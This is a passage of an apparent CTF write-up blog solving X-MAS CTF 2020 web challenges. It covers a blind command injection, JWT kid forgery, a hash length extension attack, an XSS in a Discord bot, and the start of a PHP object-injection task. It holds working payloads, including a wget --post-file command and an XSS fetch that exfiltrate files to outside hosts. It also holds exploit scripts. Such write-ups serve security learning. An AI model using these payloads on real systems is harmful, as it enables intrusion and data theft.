class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The getFlag function receives the $flag value, connects it after the wget command, and sets the output of the exec function as an array.<br><br></p><p>Here, if the command executed well, it prints Maybe, and if not, prints Nope.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>In the above part, you can see that the flag value is received, the input value is verified using the checkFlag function, and the getFlag function is executed if the filtering does not occur.<br><br></p><p>In this problem, the command execution value is not output, so the input value must be retrieved to a private server.<br><br></p><p>So, first, let’s check if there is a way to get the php file using the wget command.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.48.39.png?raw=true"><br>When I searched Google for Blind Command Injection, I could see that using the –post-file option of the wget command as above, the file was read and sent as the POST body value.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;</span><br><span class="line">  extended: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;X-MAS!!!!&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.body);</span><br><span class="line">res.send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Listening on port &#x27;</span> + PORT + <span class="string">&#x27;...&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>In order to receive the flag, I built a simple server using Node.js to output the POST body value as above.</p><p><code>Payload : $&#123;IFS&#125;-$&#123;IFS&#125;--post-file$&#123;IFS&#125;flag.php$&#123;IFS&#125;141.164.55.161</code></p><p>So, I passed the payload above as the flag value.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%207.00.30.png?raw=true"><br>When I checked the server log, I could see the flag.php file came.</p><p><code>FLAG : X-MAS&#123;s0_fL4g_M4ny_IFS_bb69cd55f5f6&#125;</code></p><hr><h3 id="Web-X-MAS-Chan"><a href="#Web-X-MAS-Chan" class="headerlink" title="(Web) X-MAS Chan"></a>(Web) X-MAS Chan</h3><p><strong>Challenge Author :</strong> yakuhito, Milkdrop<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 470<br><br><strong>Solves :</strong> 26<br><br><strong>TL;DR</strong> : JWT Modified<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.32.png?raw=true"><br>This time, we will solve the problem called <code>X-MAS Chan</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.41.21.png?raw=true"><br>If you come into trouble, you can see there are links and rules that can get you into the board.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.43.59.png?raw=true"><br>When I came to the board, I can see that the file upload function exists as above.<br><br></p><p>And as a result of checking, it was found that only photos such as jpg, png, and gif can be uploaded.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.51.25.png?raw=true"><br>Also, if you check the source code, you can see that there is getbanner.php, and the logic is logic to get a picture using jwt. <code>You can see that jwt is set as a value in a cookie called banner.</code><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.55.11.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;&#x2F;tmp&#x2F;jwt.key&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When the jwt is decoded, you can see that the header part uses the <code>HS256</code> algorithm as above and the kid value is using <code>/tmp/jwt.key</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;banner&quot;: &quot;banner&#x2F;11.gif&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As the data above, you can see that you are receiving a 11.gif photo as the value of the banner. So, if you give <code>flag.php</code> as the <code>value of banner</code>, it will read and return <code>flag.php</code>, not the picture.<br><br></p><p>So how do I <code>sign</code> JWT when I don’t know the <code>secret key</code>?<br><br></p><p>You can think of the kid value in the header as a pointer to the secret key. In the above jwt, since kid points to <code>/tmp/jwt.key</code>, the value contained in jwt.key can be used as the secret key.<br><br></p><p>So, upload a photo using the file upload function, and when the kid points to the photo, you can sign using the binary value of the photo.<br><br><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.04.11.png?raw=true"><br>I will make a gif file as above and use it.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.06.13.png?raw=true"><br>So, when I uploaded the file, you can see the file was created with the path <code>/b/src/1608071199792.gif</code>. Now, if you give the above path as the <code>kid</code> value in the jwt header, you can use the <code>binary value of the above file</code> as the <code>secret key.</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jwt.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    key = fp.read()</span><br><span class="line"></span><br><span class="line">print(jwt.encode(&#123;<span class="string">&#x27;banner&#x27;</span>: <span class="string">&#x27;flag.php&#x27;</span>&#125;, key, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=&#123;<span class="string">&#x27;kid&#x27;</span>: <span class="string">&#x27;/var/www/html/b/src/1608071199792.gif&#x27;</span>&#125;))</span><br></pre></td></tr></table></figure><p>I wrote jwt Signing code as above.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.10.23.png?raw=true"><br>If you run the code, you can see jwt appear as above.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.12.08.png?raw=true"><br>When I decode jwt and check it, I can see that the value is well entered.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.16.02.png?raw=true"><br>So when I send a request to getbanner.php using the above jwt, you can see that flag.php is displayed, not the picture.</p><p><code>FLAG : X-MAS&#123;n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400&#125;</code></p><hr><h3 id="Web-World’s-most-complex-SQL-Query"><a href="#Web-World’s-most-complex-SQL-Query" class="headerlink" title="(Web) World’s most complex SQL Query"></a>(Web) World’s most complex SQL Query</h3><p><strong>Challenge Author :</strong> Milkdrop<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 484<br><br><strong>Solves :</strong> 19<br><br><strong>TL;DR</strong> : SQL Query Analysis<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.32.05.png?raw=true"></p><hr><h3 id="Web-cat-clicker"><a href="#Web-cat-clicker" class="headerlink" title="(Web) cat_clicker"></a>(Web) cat_clicker</h3><p><strong>Challenge Author :</strong> yakuhito<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 474<br><br><strong>Solves :</strong> 24<br><br><strong>TL;DR</strong> : hash length extension attack<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.59.png?raw=true"><br>This time, we will solve the problem called <code>Cat Clicker</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.43.58.png?raw=true"><br>When it comes to problems, there is logic to buy flags using the number of cats. The fake flag seems to be available for purchase if you have one cat and the real flag is 13 cats.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.47.06.png?raw=true"><br>You can increase the number of cats by clicking on the face, but it seems like 12 is the maximum.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">state : 12 | 0</span><br><span class="line">hash : cf13ab76afb625f7f7d6c539c2cb3c84</span><br><span class="line"></span><br><span class="line">state : 12 | 1</span><br><span class="line">hash : e71f77e8f7c2c2957292f4a0e1d79d9d</span><br><span class="line"></span><br><span class="line">(Skip)</span><br><span class="line"></span><br><span class="line">state : 12 | 12</span><br><span class="line">hash : 9579729592f72a075bb61f63b8ea238e</span><br></pre></td></tr></table></figure><p>As above, the number of cats is managed by the hash value, and looking at the hash, it seems to be an md5 hash.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%204.42.16.png?raw=true"><br>And since this web service has a .git directory, you can pull out all the .git trees.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%204.46.13.png?raw=true"><br>I downloaded all the .git trees using gitdumper.sh, and you can lick the source code using the <code>git cat-file -p</code> command.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hashFor</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$secret</span> = getenv(<span class="string">&quot;SECRET_THINGY&quot;</span>); <span class="comment">// 64 random characters - impossible to guess</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;<span class="subst">$secret</span> | <span class="subst">$state</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> md5(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyState</span>(<span class="params"><span class="variable">$state</span>, <span class="variable">$hash</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$hash</span> === hashFor(<span class="variable">$state</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getParentsLimit</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(reset(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The above code is the source code of helper.php. If you look at the hashFor function, you are using <code>salt</code>. As such, the hash value cannot be predicted, but you can bypass it using a <code>hash length extension attack</code>.<br><br></p><p>Kindly the length of the salt is <code>64</code>, as you can see it shows in the tin. If you don’t know the length of the salt, you need to estimate the length using <code>brute force</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And if you look at the getCatsNo function, you can see that the last value of the array is used as the number of cats by using the end function.<br><br></p><p>Therefore, when it becomes “<code>12 | 1 | Null Byte | 1000 |</code>“, <code>1000</code> is used as the number of cats. If there is no logic to fetch only the last value of the array, it won’t work.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%205.10.35.png?raw=true"><br>So, since I know the salt length, I made a payload using <code>hashpump</code>. (<code>URL encoding</code>)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fetch = <span class="built_in">require</span>(<span class="string">&quot;node-fetch&quot;</span>);</span><br><span class="line">fetch(<span class="string">&#x27;http://challs.xmas.htsp.ro:3003/api/buy.php&#x27;</span>, &#123;</span><br><span class="line">    method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="string">&#x27;item_id=2&amp;state=12%20%7C%201%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%02%00%00%00%00%00%00%20%7C%201000&amp;hash=f48ccd5768b829f8856ae186eb4bf4a4&#x27;</span></span><br><span class="line">&#125;).then(<span class="function">(<span class="params">x</span>) =&gt;</span> x.text()).then(<span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.log(x));</span><br></pre></td></tr></table></figure><p>As above, I wrote the exploit code using JavaScript.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%205.17.01.png?raw=true"><br>Finally, return the exploit code to see the successful purchase of the flag.</p><p><code>FLAG : X-MAS&#123;1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa&#125;</code></p><hr><h3 id="Web-Comfort-Bot"><a href="#Web-Comfort-Bot" class="headerlink" title="(Web) Comfort Bot"></a>(Web) Comfort Bot</h3><p><strong>Challenge Author :</strong> Milkdrop<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 432<br><br><strong>Solves :</strong> 39<br><br><strong>TL;DR</strong> : Simple XSS<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%205.31.43.png?raw=true"><br>This time, we will solve one of the web problems from X-MAS CTF 2020 called Comfort Bot.<br><br></p><p>The peculiarity of the Comfort Bot problem was that it did not have a web server and was solved using the X-MAS bot within Discord. And it provides the source code, so let’s check the source code first.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bot.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> (message.content.startswith (<span class="string">&quot;!&quot;</span>)):</span><br><span class="line">spell = <span class="literal">True</span></span><br><span class="line">response = <span class="keyword">await</span> engine.getCleverResponse (authorID, message.content[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><p>The code above is the part that is executed when the value input from the X-MAS Discord Bot starts with an exclamation mark.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># engine.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, message</span>):</span></span><br><span class="line"><span class="keyword">if</span> (authorID == <span class="number">0</span>):</span><br><span class="line"><span class="keyword">return</span> random.choice([<span class="string">&quot;Oh, I quite certainly agree.&quot;</span>, <span class="string">&quot;There, there, it&#x27;s alright.&quot;</span>, <span class="string">&quot;Oh!&quot;</span>, <span class="string">&quot;Fascinating!&quot;</span>, <span class="string">&quot;Exquisite reply!&quot;</span>, <span class="string">&quot;Running program: COMFORT.&quot;</span>, <span class="string">&quot;Understandable.&quot;</span>, <span class="string">&quot;Hmm.&quot;</span>, <span class="string">&quot;I see.&quot;</span>, <span class="string">&quot;Well, if you really think that...&quot;</span>, <span class="string">&quot;What are you doing?&quot;</span>, <span class="string">&quot;What are you up to?&quot;</span>, <span class="string">&quot;What&#x27;s that?&quot;</span>, <span class="string">&quot;[Nodding]&quot;</span>, <span class="string">&quot;[Nodding and stroking chin saying mhmm]&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">await</span> parseUsers (cleverDriver.getCleverResponse (authorID, message))</span><br></pre></td></tr></table></figure><p>The code above is the getCleverResponse function in engile.py. In the code, you can see that if authorID is <code>0</code>, a random string in the array is printed, and if authorID is <code>not 0</code>, cleverDriver.getCleverResponse function is executed.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># driver.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">getCleverResponse</span> (<span class="params">authorID, txt</span>):</span></span><br><span class="line"><span class="keyword">global</span> driver</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.open(&#x27;http://localhost/&#x27;,&#x27;_blank&#x27;);&quot;</span>)</span><br><span class="line">windows[authorID] = driver.window_handles[-<span class="number">1</span>]</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br><span class="line"><span class="keyword">while</span> (driver.execute_script (<span class="string">&quot;return cleverbot.aistate&quot;</span>) != <span class="number">0</span>):</span><br><span class="line"><span class="keyword">await</span> asyncio.sleep (<span class="number">0.4</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line"></span><br><span class="line">reply = driver.execute_script (<span class="string">&quot;return cleverbot.reply&quot;</span>)</span><br><span class="line">switchToAuthorWindow(authorID)</span><br><span class="line">driver.execute_script(<span class="string">&quot;window.close()&quot;</span>)</span><br><span class="line">driver.switch_to_window(driver.window_handles[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> reply</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">CreateCleverDriver ()</span><br></pre></td></tr></table></figure><p>The code above is in the getCleverResmpose function in driver.py!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script = <span class="string">&quot;cleverbot.sendAI(&#x27;&#123;0&#125;&#x27;)&quot;</span>.<span class="built_in">format</span> (txt)</span><br><span class="line">driver.execute_script (script)</span><br></pre></td></tr></table></figure><p>If you look in the middle, you can see the code above. The <code>txt</code> value is put in the script variable without any verification, and the script is executed using the <code>execute_script</code> function.<br><br></p><p>You can trigger XSS in the logic right above.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script = &quot;cleverbot.sendAI(&#x27;!asdf&#x27;);fetch(&#x27;/flag&#x27;).then(x=&gt;x.text()).then(x=&gt;fetch(&quot;URL/?f=&quot; + x));(&#x27;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>If you manipulate the code and make it as above, the fetch function runs well and you can steal the flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!asdf&#39;);fetch(&#39;&#x2F;flag&#39;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&quot;https:&#x2F;&#x2F;384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net&#x2F;?f&#x3D; &quot; +x));(&#39;</span><br></pre></td></tr></table></figure><p>So I wrote the payload as above and sent it to the X-MAS Discord Bot.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%206.28.33.png?raw=true"><br>Finally, when I checked the requestbin, I could see the flag came.</p><p><code>FLAG : X-MAS&#123;0h_J1nk135!!!Why_w0uld_y0u_br34k_our_commun4l_b07???125184ae&#125;</code></p><hr><h3 id="WEB-How-Brutus-stole-Christmas"><a href="#WEB-How-Brutus-stole-Christmas" class="headerlink" title="(WEB) How Brutus stole Christmas"></a>(WEB) How Brutus stole Christmas</h3><p><strong>Challenge Author :</strong> Milkdrop<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 492<br><br><strong>Solves :</strong> 13<br><br><strong>TL;DR</strong> : Simple PHP Object Injection, WebShell<br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%206.41.24.png?raw=true"><br>This time, we will solve the problem of How Brutus stole Christmas among the web problems raised by the X-MAS CTF. This problem is a problem that I tried until the last time because I didn’t have enough time to solve it.<br><br></p><p>The peculiar thing about this problem is that one CTF site is given as a problem, and the problem is that the CTF site is hacked using the problem in the given CTF site.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pageContent</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$file_name</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$newContent</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="keyword">$this</span>-&gt;file_name=<span class="string">&quot;data/content.txt&quot;</span>; </span><br><span class="line">    <span class="variable">$file</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;newContent=<span class="variable">$file</span>;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;newContent;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setContent</span>(<span class="params"><span 